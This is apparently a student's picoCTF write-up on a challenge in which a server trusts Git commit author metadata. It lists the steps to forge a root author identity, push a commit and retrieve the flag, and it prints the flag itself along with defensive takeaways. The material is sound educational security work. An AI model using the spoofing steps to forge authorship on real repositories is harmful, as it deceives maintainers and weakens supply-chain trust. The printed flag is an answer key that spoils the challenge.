---

## Overview

This challenge demonstrates a critical security concept:

Git commit metadata (author identity) can be easily manipulated and should NOT be trusted for authentication.

The objective was to retrieve the flag by impersonating a privileged user (root) through Git commit metadata.

---

## Key Concept: Identity Spoofing

Git does NOT verify identity.

When you run:

git config user.name root
git config user.email root@picoctf

You are NOT becoming root.
You are only labeling your commit as root.

Git blindly trusts user input.

---

## Vulnerability

The server logic was:

"If commit author is root → trust it"

This is insecure because:

- Author name is user-controlled
- No verification exists
- Anyone can impersonate anyone

---

## Attack Steps

1. Clone repository

git clone <challenge_url>
cd challenge

2. Create flag file

touch flag.txt
git add flag.txt

3. Impersonate root

git config user.name root
git config user.email root@picoctf

4. Commit

git commit -m "add flag"

5. Push

git push origin master

6. Retrieve flag

git pull
cat flag.txt

---

## Result

picoCTF{1mp3rs0n4t4_g17_345y_367122f4}

---

## Key Takeaways

1. Git is NOT a security system  
Git is only a version control tool

2. Metadata is untrusted  
Author info can be changed freely

3. Identity ≠ Authentication  
Looking like root does not mean you are root

4. Never trust user-controlled data  
Always verify identity using secure methods

---

## Real-World Insight

This concept applies to:

- Supply chain attacks
- Fake commit authorship
- CI/CD trust issues
- Identity spoofing vulnerabilities

---

## One-Line Summary

Git commit identity can be forged — never trust metadata for authentication.

---

## Personal Reflection

This challenge helped me understand that systems relying on visible identity (like usernames or emails) without verification are vulnerable.

It reinforced the importance of validating identity rather than trusting labels.
